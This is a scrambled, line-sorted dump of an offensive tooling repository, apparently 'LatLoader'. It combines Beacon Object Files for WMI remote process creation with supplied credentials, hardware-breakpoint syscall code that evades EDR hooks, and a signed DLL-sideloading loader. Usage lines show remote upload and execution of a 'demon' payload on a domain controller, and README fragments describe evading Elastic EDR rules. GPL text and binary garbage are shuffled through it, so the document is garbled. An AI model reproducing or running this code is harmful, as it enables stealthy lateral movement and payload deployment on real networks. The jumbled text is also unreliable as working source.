+"hr = OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, authidentity, EOAC_NONE)"
+"hr = locator->ConnectServer(srv, NULL, NULL, 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, "
+"hr = pClass->GetMethod(wcMethodName, 0, "
+"hr = pInParamsDefinition->SpawnInstance(0, "
+"hr = pParamsInstance->Put(wcCommandLine, 0, "
+"hr = pParamsInstance->Put(wcCurrentDirectory, 0, "
+"hr = pParamsInstance->Put(wcProcessStartupInfo, 0, "
+"hr = pStartupInstance->Put(wcShowWindow, 0, "
+"hr = pStartupObject->SpawnInstance(0, "
+"hr = pSvc->ExecMethod(wcClassName, wcMethodName, 0, NULL, pParamsInstance, "
+"hr = pSvc->GetObject(wcClassName, 0, NULL, "
+"hr = pSvc->GetObject(wcStartup, 0, NULL, "
+"hs""C}"
+"if any, to sign a ""copyright disclaimer"" for the program, if necessary."
+"image02.png"""
+"image02.png"")"
+"import re, time, string, random"
+"in a country, would infringe one or more identifiable patents in that"
+"in a fashion requiring copyright permission, other than the making of an"
+"in or on a volume of a storage or distribution medium, is called an"
+"in the business of distributing software, under which you make payment"
+"include ""HWSyscalls.h"""
+"include ""beacon.h"""
+"infringement under applicable copyright law, except executing it on a"
+"int __cdecl main(int argc, char "
+"int main(int argc, char "
+"interfaces specified for a particular programming language, one that"
+"into a dwelling.  In determining whether a product is a consumer product,"
+"into proprietary programs.  If your program is a subroutine library, you"
+"license to downstream recipients.  ""Knowingly relying"" means you have"
+"linked subprograms that the work is specifically designed to require,"
+"load.exe"")"
+"machine-readable Corresponding Source under the terms of this License,"
+"make it effectively proprietary.  To prevent this, the GPL assures that"
+"make, use, sell, offer for sale, import and otherwise run, modify and"
+"menu, a prominent item in the list meets this criterion."
+"modification of the work as a means of enforcing, against the work's"
+"modified object code on the User Product (for example, the work has"
+"modified versions of the software inside them, although the manufacturer"
+"modify it is void, and will automatically terminate your rights under"
+"must place, in the relevant source files, a statement of the"
+"n""), argv[2])"
+"n""), dwBytesToWrite, argv[2])"
+"n""), dwBytesWritten, argv[2])"
+"n"", (DWORD64)ExceptionInfo->ExceptionRecord->ExceptionAddress)"
+"n"", (const char"
+"n"", ExceptionInfo->ExceptionRecord->ExceptionAddress)"
+"n"", GetLastError())"
+"n"", argv[1])"
+"n"", argv[2])"
+"n"", dwBytesWritten, filePath)"
+"n"", fileName)"
+"n"", filePath)"
+"n"", ntFunctionAddress)"
+"n"", retGadgetAddress)"
+"n"", syscallNumber)"
+"n"", syscallReturnAddress)"
+"n"", targetHost)"
+"n===============HWSYSCALLS DEBUG==============="")"
+"not accept this License.  Therefore, by modifying or propagating a"
+"not convey it at all.  For example, if you agree to terms that obligate you"
+"not impose a license fee, royalty, or other charge for exercise of"
+"nyo,"
+"oO.:c""jL"
+"of having them make modifications exclusively for you, or provide you"
+"of sections 4 and 5, provided that you also convey the"
+"of that license document, provided that the further restriction does"
+"of the GPL, as needed to protect the freedom of users."
+"or convey a specific copy of the covered work, then the patent license"
+"or household purposes, or (2) anything designed or sold for incorporation"
+"or that patent license was granted, prior to 28 March 2007."
+"organization, or merging organizations.  If propagation of a covered"
+"organization, or substantially all assets of one, or subdividing an"
+"otherwise) that contradict the conditions of this License, they do not"
+"owned or controlled by the contributor, whether already acquired or"
+"pClass, NULL)"
+"pData, "
+"pInParamsDefinition, NULL)"
+"pOutParams, NULL)"
+"pStartupObject, NULL)"
+"packaging a Major Component, but which is not part of that Major"
+"parser, NULL)"
+"parser, args, length)"
+"parser, buf, len)"
+"parser, buff, len)"
+"parties who would receive the covered work from you, a discriminatory"
+"parts of the General Public License.  Of course, your program's commands"
+"patent license for this particular work, or (3) arrange, in a manner"
+"patent license under the contributor's essential patent claims, to"
+"permission, would make you directly or secondarily liable for"
+"permissions.  However, no additional obligations are imposed on any"
+"poc.txt"""
+"possible use to the public, the best way to achieve this is to make it"
+"pragma comment(lib, ""comsuppw.lib"")"
+"pragma comment(lib, ""credui.lib"")"
+"pragma comment(lib, ""wbemuuid.lib"")"
+"print(f""[debug] [exec] params1: {params}"")"
+"print(f""[debug] [exec] type(params[0]): {type(params[0])}"")"
+"print(f""[debug] [rupload] type(params[0]): {type(params[0])}"")"
+"procedures, authorization keys, or other information required to install"
+"produce it from the Program, in the form of source code under the"
+"produce the work, or an object code interpreter used to run it."
+"product received by a particular user, ""normally used"" refers to a"
+"products.  If such problems arise substantially in other domains, we"
+"propagate that work, subject to this License.  You are not responsible"
+"provisionally, unless and until the copyright holder explicitly and"
+"public, and in some countries other activities as well."
+"publicly available network server or other readily accessible means,"
+"purposes of this definition, ""control"" includes the right to grant"
+"receive it, in any medium, provided that you conspicuously and"
+"received it, or any part of it, contains a notice stating that it is"
+"receives a license from the original licensors, to run, modify and"
+"receiving the covered work authorizing them to use, propagate, modify"
+"reinstated, you do not qualify to receive new licenses for the same"
+"remove any additional permissions from that copy, or from any part of"
+"requirement to continue to provide support service, warranty, or updates"
+"restriction, you may remove that term.  If a license document contains"
+"restrictions"" within the meaning of section 10.  If the Program as you"
+"rights granted or affirmed under this License.  For example, you may"
+"rights granted under this License, and you may not initiate litigation"
+"rights of fair use or other equivalent, as provided by copyright law."
+"sale, or importing the Program or any portion of it."
+"section 13, concerning interaction through a network will apply to the"
+"size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)"
+"software for all its users.  We, the Free Software Foundation, use the"
+"software on general-purpose computers, but in those that do, we wish to"
+"source code form), and must require no special password or key for"
+"specifically for use in, a User Product, and the conveying occurs as"
+"standard defined by a recognized standards body, or, in the case of"
+"sue for patent infringement).  To ""grant"" such a patent license to a"
+"szMask, "
+"tangible personal property which is normally used for personal, family,"
+"terms of section 4, provided that you also meet all of these conditions:"
+"test.exe"")"
+"than the work as a whole, that (a) is included in the normal form of"
+"the ""copyright"" line and a pointer to where the full notice is found."
+"the Program, the only way you could satisfy both those terms and this"
+"the covered work, and you disclaim any intention to limit operation or"
+"the interface presents a list of user commands or options, such as a"
+"the library.  If this is what you want to do, use the GNU Lesser General"
+"the scope of its coverage, prohibits the exercise of, or is"
+"the source code needed to generate, install, and (for an executable"
+"the work, and the source code for shared libraries and dynamically"
+"the work, and under which the third party grants, to any of the"
+"them if you wish), that you receive source code or can get it if you"
+"these rights or asking you to surrender the rights.  Therefore, you have"
+"to copy, free of charge and under the terms of this License, through a"
+"to receive a copy likewise does not require acceptance.  However,"
+"to take away your freedom to share and change the works.  By contrast,"
+"typical or common use of that class of product, regardless of the status"
+"under those permissions, but the entire Program remains governed by"
+"unpacking, reading or copying."
+"use, which is precisely where it is most unacceptable.  Therefore, we"
+"users, your or third parties' legal rights to forbid circumvention of"
+"varCommand, 0)"
+"varCurrentDir, 0)"
+"varParams, 0)"
+"versions of the GNU General Public License can be used, that proxy's"
+"violation by some reasonable means, this is the first time you have"
+"vtDispatch, 0)"
+"want it, that you can change the software or use pieces of it in new"
+"which are not part of the work.  For example, Corresponding Source"
+"with facilities for running those works, provided that you comply with"
+"work results from an entity transaction, each party to that"
+"work thus licensed is called the contributor's ""contributor version""."
+"work under this License, and how to view a copy of this License.  If"
+"work) run the object code and to modify the work, including scripts to"
+"works, such as semiconductor masks."
+"works, which are not by their nature extensions of the covered work,"
+"xC3"", (PCHAR)""xxxxx"")"
+"your programs, too."
+"} LDR_DATA_TABLE_ENTRY, "
+"} PEB, "
+"} PEB_LDR_DATA, "
+"} RTL_USER_PROCESS_PARAMETERS, "
+"} UNICODE_STRING, "
+$(CC_x64) -o bin/$(WRITEFILEBOFNAME).x64.o -c src/writefileBOF.c -w
+$(CC_x64) src/standalone/writefile.c -s -w -static -o bin/standalone/writefile.exe
+$(CXX_x64) -o bin/$(WMIBOFNAME).x64.o -c src/wmiBOF.cpp -w
+$(CXX_x64) src/sideloader.cpp src/HWSyscalls.cpp src/cryptbase.def -static -s -w -shared -fpermissive -o bin/sideloader.dll
+$(CXX_x64) src/standalone/wmiexec.cpp -I include -l oleaut32 -l ole32 -l wbemuuid -s -w -static -o bin/standalone/wmiexec.exe
+$)>SFG
+$jAq
+$jfeu6@B
+$wUt%{a
+${ey
+'$Dv
+'YB)KPEu
+']1f
+( IN
+((PBYTE)functionAddress 
+(1 << 16)
+(1 << 17)
+(5D6wE8zw
+(8Q<
+(PULONG64)(ExceptionInfo->ContextRecord->Rsp 
+(PULONG64)(ExceptionInfo->ContextRecord->Rsp) = retGadgetAddress
+(including a cross-claim or counterclaim in a lawsuit) alleging that
+(such as an express permission to practice a patent or covenant not to
+(wchar_t
+) combine the previous two in order to perform automated lateral movement.
+) malloc(size)
+)())base_addr)()
+)())exec)()
+)(ExceptionInfo->ContextRecord->Rcx))
+)(moduleBase 
+)BeaconDataExtract(
+)domain
+)id->Domain)
+)id->Password)
+)id->User)
+)malloc(size)
+)nR[]
+)password
+)user
+)w7e
+----
+-:o>Y
+-H-7
+-Xa!
+.0s1
+._)c4H
+.cATk
+.s5bOCS
+// .
+// DiskLoader writefile dc1 /root/demon.x64.exe C:
+// Doesnt currently work but should let you use current context
+// Free Strings in mem
+// Handle Cred material
+// Use make!
+// sideload into DiskSnapShot.exe as cryptbase.dll
+// x86_64-w64-mingw32-g
+// x86_64-w64-mingw32-gcc -c writefileBOF.c -w -o /share/writeFileBOF.x64.o
+// x86_64-w64-mingw32-gcc writefile.c -w -static -o /share/write.exe
+//Arg: create the arg
+//Arg: the command to be executed
+//BEACON operations
+//BeaconDataParse(
+//Execute Method
+//Filling the pStartupInstance
+//Free String
+//Free String in Mem
+//Free String in mem
+//Free Strings
+//Handling command execution
+//Pass the arg to the Win32_ProcessStartup instance and clean it
+//Store the arg in the Win32_ProcessStartup and clean it
+//Store the value for the in parameters
+//We will fill the parameters in the pParamsInstance instance
+//pInParamsDefinition will receive the paramters signature for the Win32_Process.Create(...) method. We should fill these params and call the method
+/I9SW
+/zbrgnq8Ik
+010!0
+1%MH
+1Cr[}}
+3Ze[
+3dm5
+4Ozr
+4PKs
+4tI2
+6w7$
+8SRQ$o
+9<qqxb
+:(Mw%
+:(Rl9
+:.AW
+:/Zq
+:=cjh
+<'tCfL
+<[9AJ
+<https://www.gnu.org/licenses/>.
+<https://www.gnu.org/licenses/why-not-lgpl.html>.
+= (1 << 0)
+= calcsize(fmt)
+=(pVy
+=>iCZ3v
+=[ dL
+=m>5L.E
+=tlD
+@H%F
+@nPPE
+A8nM
+AFNd0
+APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
+AT]b(nYs{9%
+Additional permissions that are applicable to the entire Program shall
+Also add information on how to contact you by electronic and paper mail.
+Anx<
+ArPm@Hv
+B-T:
+B:_/
+BA$RH8T9.y
+BOOL MaskCompare(const BYTE
+BSTR     WINAPI
+BSTR pass = OLEAUT32$SysAllocString(bwpassword)
+BSTR srv = OLEAUT32$SysAllocString(bwtarget2)
+BSTR usr = OLEAUT32$SysAllocString(bwusername)
+BSTR wcCommandExecute = OLEAUT32$SysAllocString(bwcommandline)
+BeaconDataParse(
+Bypass:
+C=pMU=
+CCMCache
+CC_x64 := x86_64-w64-mingw32-gcc
+CIMV2'
+CLSID Cwbm
+COAUTHIDENTITY
+COAUTHINFO
+CXCly
+CXX_x64 := x86_64-w64-mingw32-g
+CXX_x86 := i686-w64-mingw32-g
+CcQZq=
+Corresponding Source conveyed under this section must be accompanied
+CreateCreds(
+Cun8
+Cwbm)
+D'ws.9E
+D<H PO(
+DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
+DECLSPEC_IMPORT
+DECLSPEC_IMPORT 
+DECLSPEC_IMPORT         VOID     WINAPI         OLEAUT32$SysFreeString(BSTR bstrString)
+DECLSPEC_IMPORT BOOL   BeaconIsAdmin()
+DECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token)
+DECLSPEC_IMPORT BOOL   toWideChar(char 
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(
+DECLSPEC_IMPORT char 
+DECLSPEC_IMPORT int     BeaconDataInt(datap 
+DECLSPEC_IMPORT int     BeaconDataLength(datap 
+DECLSPEC_IMPORT short   BeaconDataShort(datap 
+DECLSPEC_IMPORT void    BeaconDataParse(datap 
+DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp 
+DECLSPEC_IMPORT void    BeaconFormatAppend(formatp 
+DECLSPEC_IMPORT void    BeaconFormatFree(formatp 
+DECLSPEC_IMPORT void    BeaconFormatInt(formatp 
+DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp 
+DECLSPEC_IMPORT void    BeaconFormatReset(formatp 
+DECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION 
+DECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION 
+DECLSPEC_IMPORT void   BeaconRevertToken()
+DECLSPEC_IMPORT void WINAPI KERNEL32$Sleep(
+DWORD64 FindSyscallNumber(DWORD64 functionAddress)
+DWORD64 FindSyscallNumber(DWORD64 functionAddress) {
+Description:
+DiskSnapShot.exe 
+DiskSnapShot.exe C:
+E.::R
+E<E7O(
+ENABLE_ECHO_INPUT))
+EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
+EXPORTS
+ErD>
+FEMMf
+Fn'mzzTXYtO
+Foundation.  If the Program does not specify a version number of the
+GNU General Public License for most of our software
+HANDLE hNtdll
+HANDLE myThread
+HRESULT  WINAPI
+HRESULT hr = S_OK
+HWSyscallExceptionHandler)
+I have also provided standalone versions of the BOFs used in this project. These could be useful if you are unfamiliar with BOF development and would like to learn by comparing a normal program to it's BOF counterpart.
+I8ri(
+IF1GBFYd
+IID Iwbm
+IQ1yo
+IWbemClassObject
+IWbemLocator
+IWbemServices
+Ikwt
+Inject Functions 
+IsCurrent = BeaconDataInt(
+Iwbm)
+KLsI
+LDTG
+LONG HWSyscallExceptionHandler(EXCEPTION_POINTERS
+LatLoader load dc1 /root/test.exe
+LatLoader rupload dc1 /root/demon.x64.exe C:
+LatLoader sideload dc1 /root/demon.x64.bin
+LatLoader xorload dc1 /root/demon.x64.bin
+Lfxv
+License by making exceptions from one or more of its conditions.
+License of the Program or a work on which the Program is based.  The
+License would be to refrain entirely from conveying the Program.
+Lv4O7Xx
+MIS5DJIk0d
+NGA7
+NkKC
+NtAllocateVirtualMemory
+OGdn
+OLE32$CLSIDFromString(wchar_t
+OLE32$CoSetProxyBlanket(IUnknown
+OLE32$CoUninitialize()
+OLE32$IIDFromString(wchar_t
+OLEAUT32$SysAllocString(const OLECHAR 
+OLEAUT32$SysFreeString(Cwbmstr)
+OLEAUT32$SysFreeString(Iwbmstr)
+OLEAUT32$SysFreeString(pass)
+OLEAUT32$SysFreeString(srv)
+OLEAUT32$SysFreeString(usr)
+OLEAUT32$SysFreeString(wcClassName)
+OLEAUT32$SysFreeString(wcCommandExecute)
+OLEAUT32$SysFreeString(wcCommandLine)
+OLEAUT32$SysFreeString(wcCurrentDirectory)
+OLEAUT32$SysFreeString(wcMethodName)
+OLEAUT32$SysFreeString(wcProcessStartupInfo)
+OLEAUT32$SysFreeString(wcShowWindow)
+OLEAUT32$SysFreeString(wcStartup)
+OLEAUT32$VariantClear(
+OLEAUT32$VariantClear(VARIANTARG 
+OLEAUT32$VariantInit(
+OLEAUT32$VariantInit(VARIANTARG 
+P-3'wO
+P/}6m
+POw 9
+PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
+PVOID exceptionHandlerHandle
+PYYd>3
+Pach/{VE
+PpWTR
+PrepareSyscall
+PrepareSyscall) {
+Program specifies that a certain numbered version of the GNU General
+Q9uB]
+Qz3kxuH
+ROOT
+SSOO.P
+SUCH DAMAGES.
+SX.$-
+Source.
+SrI6
+States should not allow patents to restrict development and use of
+System32
+SystemFunction036=SystemFunction036_Proxy
+SystemFunction036_Type)(void
+T8I6m!C
+THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
+Temp
+The 
+The following is a list of various Elastic EDR rules that could alert when performing lateral movement. I have provided what steps were taken to evade each rule. All evasions described here were implemented in the 
+The hypothetical commands 
+This module was designed to work on Linux systems with 
+UINT64 GetModuleAddress(LPWSTR moduleName) {
+UINT64 GetModuleAddress(LPWSTR sModuleName)
+UINT64 PrepareSyscall(char
+UINT64 callRegGadgetAddress
+UINT64 callRegGadgetAddressRet
+UINT64 k32FunctionAddress
+UINT64 ntFunctionAddress
+UINT64 regBackup
+UINT64 retGadgetAddress
+UINT64 stackArgs[STACK_ARGS_LENGTH]
+URWl!wa.
+USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
+UTHc
+UnAF9
+User Product is transferred to the recipient in perpetuity or for a
+VARIANT varCommand
+VARIANT varCurrentDir
+VARIANT varParams
+VARIANT vtDispatch
+VEI[R
+VOID     WINAPI
+VYPUn
+Video demo w/ Elastic EDR: https://youtu.be/W0PZZPpsO6U
+VkiH
+W=iU_
+WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap()
+WINBASEAPI int __cdecl MSVCRT$sprintf(char 
+WINBASEAPI int __cdecl MSVCRT$strlen(const char 
+WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t 
+WINBASEAPI void 
+WMIBOFNAME := ProcCreate
+WRITEFILEBOFNAME := writefileBOF
+WZ>AP
+Windows
+XQxR:M$a
+Y@rp
+Z B0
+Z-f=h
+Z0Pp(_Y:hY
+ZGZ<
+[WjV
+[XHJfyAXA
+[e20rXA
+[hT)Uv
+] Continuing with normal execution
+] Created a new stack frame with RET_GADGET (%
+] Found 
+] Found %s address: 0x%I64X
+] Found RET_GADGET in kernel32.dll: %
+] Found RET_GADGET in kernelbase.dll: %
+] Found SSN: 0x%X
+] Function is HOOKED!
+] Function is not hooked
+] Jumping to 
+] Looking for the SSN via Halos Gate
+] Main HWBP set successfully
+] Moving breakpoint back to PrepareSyscall to catch the next invoke
+] Moving breakpoint to %
+] NTAPI Function Breakpoint Hit (%
+] Original stack arguments successfully copied over to the new stack
+] PrepareSyscall Breakpoint Hit (%
+]oN{
+_>@Sm
+_IU!
+_Str)
+__declspec(dllexport) DWORD SystemFunction036_Proxy(void
+a further restriction but permits relicensing or conveying under this
+a modified version of its Corresponding Source.  The information must
+a%9ePhsSJw
+a< Ev
+address new problems or concerns.
+adversely affects the operation of the network or violates the rules and
+all:
+an absolute waiver of all civil liability in connection with the
+and execute modified versions of a covered work in that User Product from
+and the Corresponding Source of the work is not available for anyone
+and you may offer support or warranty protection for a fee.
+any implied license or other defenses to infringement that may
+any other work released this way by its authors.  You can apply it to
+appropriately publish on each copy an appropriate copyright notice
+argv)
+argv[])
+argv[]) {
+authInfo = inf
+authidentity = NULL
+authidentity = id
+author or copyright holder as a result of your choosing to follow a
+authors of previous versions.
+avoid the special danger that patents applied to a free program could
+b5NB
+b9S>JK
+bMask)
+been installed in ROM).
+beyond what the individual works permit.  Inclusion of a covered work
+bool DeinitHWSyscalls()
+bool DeinitHWSyscalls() {
+bool FindRetGadget() {
+bool InitHWSyscalls()
+bool InitHWSyscalls() {
+bool SetMainBreakpoint()
+bool SetMainBreakpoint() {
+but do not include claims that would be infringed only as a
+bwcommandline =
+bwdomain =
+bwpassword =
+bwtarget2 =
+bwusername =
+by the Free Software Foundation.
+by the Installation Information.  But this requirement does not apply
+cache
+can do so.  This is fundamentally incompatible with the aim of
+can regenerate automatically from other parts of the Corresponding
+char 
+char callRegGadgetValue
+cimv2 namespace
+circumvention of technological measures to the extent such circumvention
+class WmiPacker:
+code is in no case prevented or interfered with solely because
+combination as such.
+conditioned on the non-exercise of one or more of the rights that are
+conditions are met.  This License explicitly affirms your unlimited
+consequence of further modification of the contributor version.  For
+copy of the Program in return for a fee.
+country that you have reason to believe are valid.
+covered work so as to satisfy simultaneously your obligations under this
+cryptbase.dll 
+cryptbase.png C:
+ctx)
+ctx)) {
+cux%QQ
+dU%M
+dUrx
+dZ2V
+datap parser
+define CALLBACK_ERROR       0x0d
+define CALLBACK_OUTPUT      0x0
+define CALLBACK_OUTPUT_OEM  0x1e
+define CALLBACK_OUTPUT_UTF8 0x20
+define DOWN 32
+define STACK_ARGS_LENGTH 8
+define STACK_ARGS_RSP_OFFSET 0x28
+define UNICODE
+define UP -32
+define X64_PEB_OFFSET 0x60
+define _WIN32_DCOM
+dhvG'nO2LT
+diff-a546f8d6214e32d67e92e76125daa6cb3a4d516616c79f12ccdadffd9c3c2b5b) for example).
+documented (and with an implementation available to the public in
+doubtful cases shall be resolved in favor of coverage.  For a particular
+e$5m
+e.33h
+eI%zV
+eMiyP.9
+elastic-edr-rule-evasions).
+else
+endif
+excuse you from the conditions of this License.  If you cannot convey a
+exec
+fS@/
+fileName = argv[1]
+folM0
+for and in connection with specific products or compilations that
+for enforcing compliance by third parties with this License.
+for which you have or can give appropriate copyright permission.
+form of a work.
+free software which everyone can redistribute and change under these terms.
+g(hlvuH 
+gD=<bd
+goat.txt 
+governed by this License along with a term that is a further
+hJv3[
+have designed this version of the GPL to prohibit the practice for those
+have the freedom to distribute copies of free software (and charge for
+help LatLoader
+help LatLoader [subcommand]
+holder fails to notify you of the violation by some reasonable means
+hr = S_OK
+iK-6s
+id = (COAUTHIDENTITY
+id = NULL
+id->Domain = (USHORT
+id->DomainLength = MSVCRT$wcslen((const wchar_t
+id->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE
+id->Password = (USHORT
+id->PasswordLength = MSVCRT$wcslen((const wchar_t
+id->User = (USHORT
+id->UserLength = MSVCRT$wcslen((const wchar_t
+if (!SUCCEEDED(hr)) {
+if (FAILED(hr)) {
+if (IsCurrent == 0)
+if (SUCCEEDED(hr)) {
+if (hr != RPC_E_CHANGED_MODE) {
+if HWSYSCALLS_DEBUG == 0
+if neither you nor any third party retains the ability to install
+implementation is available to the public in source code form.  A
+in accord with this section must be in a format that is publicly
+in an aggregate does not cause this License to apply to the other
+in force.  You may convey covered works to others for the sole purpose
+in one of these ways:
+include <combaseapi.h>
+include <comdef.h>
+include <comdef.h> // commenting this out prevents the BOF from crashing
+include <inttypes.h>
+include <iostream>
+include <stdio.h>
+include <strsafe.h>
+include <wbemcli.h>
+include <wbemidl.h>
+include <windows.h>
+included in conveying the object code work.
+includes interface definition files associated with source files for
+inf->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT
+inf->dwAuthnSvc = RPC_C_AUTHN_WINNT
+inf->dwAuthzSvc = RPC_C_AUTHZ_NONE
+inf->dwCapabilities = EOAC_NONE
+inf->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE
+inf->pAuthIdentityData = id
+inf->pwszServerPrincName = NULL
+int    length
+int    size
+int IsCurrent
+int decode(unsigned char 
+int hittem()
+int math(unsigned char 
+is a consumer product regardless of whether the product has substantial
+is effected by exercising rights under this License with respect to
+is widely used among developers working in that language.
+it.  (Additional permissions may be written to require their own
+k)(N
+kE!7$b0-v
+keep intact all notices of the absence of any warranty
+keep intact all notices stating that this License and any
+kg8w
+know their rights.
+ku5j_1KP
+lGP_!}[
+lW>wk/j
+later version.
+lg1w6z<
+license from a particular copyright holder is reinstated (a)
+licenses of parties who have received copies or rights from you under
+licenses to the work the party's predecessor in interest had or could
+llx) as the return address
+llx)!
+load
+locator)
+make
+makes it unnecessary.
+material under section 10.
+may consider it more useful to permit linking proprietary applications with
+measure under any applicable law fulfilling obligations under article
+measures.
+might be different
+mingw-w64
+mkdir -p bin
+mkdir -p bin/standalone
+mode)
+modification follow.
+modification has been made.
+modify any covered work.  These actions infringe copyright if you do
+n)TV
+n2J(]7{
+n6oHATLX
+network may be denied when the modification itself materially and
+non-permissive terms added in accord with section 7 apply to the code
+not control copyright.  Those thus making or running the covered works
+not survive such relicensing or conveying.
+nothing other than this License grants you permission to propagate or
+notice like this when it starts in an interactive mode:
+occurring solely as a consequence of using peer-to-peer transmission
+of the particular user or of the way in which the particular user
+oink.txt
+ok.exe
+on the Program.
+option of following the terms and conditions either of that numbered
+or can get the source code.  And you must show them these terms so they
+osslsigncode sign -pkcs12 src/cert_0.pfx -in bin/sideloader.dll -out bin/signed_sideloader.dll
+otherwise be available to you under applicable patent law.
+pData != 
+pLoc = NULL
+pLoc)
+pParamsInstance)
+pStartupInstance)
+pSvc                              // IWbemServices proxy
+pSvc = NULL
+pSvc)
+paragraph of section 11).
+params
+params ):
+params = params[1:]
+params = params[1:] 
+params):
+parser)
+part of a transaction in which the right of possession and use of the
+parties to make or receive copies.  Mere interaction with a user through
+parts of the aggregate.
+party means to make such an agreement or commitment not to enforce a
+patent against the party.
+patent license (a) in connection with copies of the covered work
+patent sublicenses in a manner consistent with the requirements of
+patents cannot be used to render the program non-free.
+pattern of such abuse occurs in the area of products for individuals to
+peb->LoaderData->InMemoryOrderModuleList
+permission to link or combine any covered work with a work licensed
+permission to run the unmodified Program.  The output from running a
+poc.txt
+poc3.txt
+pragma endregion
+pragma once
+pragma region BinaryPatternMatching
+pragma region Defines
+pragma region Function Declerations
+pragma region GlobalVariables
+pragma region HalosGate
+pragma region Macros
+pragma region PEBGetProcAddress
+pragma region Type Defintions
+price.  Our General Public Licenses are designed to make sure that you
+print(fileBytes[0:10])
+prior to 60 days after the cessation.
+programs which are used unmodified in performing those activities but
+propagate the contents of its contributor version.
+protecting users' freedom to change the software.  The systematic
+protocols for communication across the network.
+provided under this License.  Any attempt otherwise to propagate or
+public statement of acceptance of a version permanently authorizes you
+pvarg)
+q2YW
+r0T9H
+received notice of violation of this License (for any work) from that
+recipients a copy of this License along with the Program.
+reinstated permanently if the copyright holder notifies you of the
+removal in certain cases when you modify the work.)  You may place
+return
+reviewing courts shall apply local law that most closely approximates
+rm -f bin/signed_sideloader.dll
+run a copy of the Program.  Ancillary propagation of a covered work
+rupload
+same work.
+share and change all versions of a program--to make sure it remains free
+show c' for details.
+show c' should show the appropriate
+show w' and 
+show w'.
+sideload
+sideloader.c
+sideloader.cpp
+sign:
+similar laws prohibiting or restricting circumvention of such
+software and other kinds of works.
+specifically granted under this License.  You may not convey a covered
+stand ready to extend this provision to those domains in future versions
+standalone:
+state the exclusion of warranty
+static wchar_t
+str)
+subprograms and other parts of the work.
+such as by intimate data communication or control flow between those
+suffice to ensure that the continued functioning of the modified object
+system32
+szMask
+szMask == 'x' 
+tOj hXw90u 4
+tRkTV50O
+technological measures.
+tells the user that there is no warranty for the work (except to the
+test.exe
+test.txt 
+test.txt'
+that material) supplement the terms of this License with terms:
+that there is no warranty for this free software.  For both users' and
+that they are valid under applicable law.  If additional permissions
+the GNU General Public License from time to time.  Such new versions will
+the GNU General Public License is intended to guarantee your freedom to
+the User Product in which it has been modified or installed.  Access to a
+the above requirements apply either way.
+the conditions stated below.  Sublicensing is not allowed
+the only significant mode of use of the product.
+the predecessor has it or can get it with reasonable efforts.
+the terms of this License in conveying all material for which you do
+then you must either (1) cause the Corresponding Source to be so
+this License (including any patent licenses granted under the third
+this License without regard to the additional permissions.
+this License.
+this License.  If your rights have been terminated and not permanently
+to attach them to the start of each source file to most effectively
+to choose that version for the Program.
+to collect a royalty for further conveying from those to whom you convey
+to the extent that it includes a convenient and prominently visible
+to the third party based on the extent of your activity of conveying
+transaction who receives a copy of the work also receives whatever
+typedef BOOL(
+typedef BOOL(WINAPI
+typedef NTSTATUS(NTAPI 
+typedef struct _LDR_DATA_TABLE_ENTRY {
+typedef struct _PEB {
+typedef struct _PEB_LDR_DATA {
+typedef struct _RTL_USER_PROCESS_PARAMETERS {
+typedef struct _UNICODE_STRING {
+typedef struct {
+u-qR
+u0zY
+uV1XhVX
+under version 3 of the GNU Affero General Public License into a single
+unsigned char
+used to limit the access or legal rights of the compilation's users
+userAcct =  NULL 
+vB2)oa$ZL
+varCommand)
+varCommand.bstrVal = NULL
+varCommand.bstrVal = wcCommandExecute
+varCommand.vt = VT_BSTR
+varCurrentDir)
+varCurrentDir.bstrVal = NULL
+varCurrentDir.vt = VT_BSTR
+varParams)
+varParams.intVal = SW_SHOW
+varParams.vt = VT_I2
+version or of any later version published by the Free Software
+void CreateCreds(COAUTHINFO
+void go(char
+void go(char 
+vtDispatch)
+vtDispatch.byref = pStartupInstance
+vtDispatch.vt = VT_DISPATCH
+wQVc
+wU4sT<ZL}
+wchar_t
+where to find the applicable terms.
+windows
+wmi2.txt
+wmiBOF.cpp
+wmiexec.cpp
+wmiexec.exe dc1 'cmd.exe /c whoami > c:
+work and works based on it.
+work if you are a party to an arrangement with a third party that is
+write.exe .
+writefile.c
+writefile.exe .
+writefileBOF.c
+x3E][
+x86_64-w64-mingw32-g
+x86_64-w64-mingw32-gcc writefile.c -w -static -o /share/writefile.exe
+xorload
+yPU_)]tK.V> 
+yQfBc$
+yf'%
+you grant is automatically extended to all recipients of the covered
+you modify it: responsibilities to respect the freedom of others.
+your copyrighted material outside their relationship with you.
+your receipt of the notice.
+z5iEm3qW2
+zgg<
+zph$W
+{R4Fj
+{fsdX
+{params[ 0 ]}
+} datap
+} formatp
+}3BQl
